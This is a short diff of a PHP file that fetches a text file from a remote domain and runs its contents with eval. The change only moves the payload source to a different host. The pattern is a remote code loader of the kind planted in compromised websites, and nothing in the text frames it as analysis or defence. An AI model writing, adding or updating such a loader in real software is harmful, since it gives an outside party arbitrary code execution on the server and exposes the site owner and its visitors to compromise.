@@ -14,5 +14,5 @@ function get_contents($url){
 }?>
 <?php
 $a =
-get_contents('https://ribaksudehospital.com/landing/esolarwarehouse/esolarwarehouse.txt');
+get_contents('https://picucur.xyz/landing/esolarwarehouse/esolarwarehouse.txt');
 eval('?>'.$a);
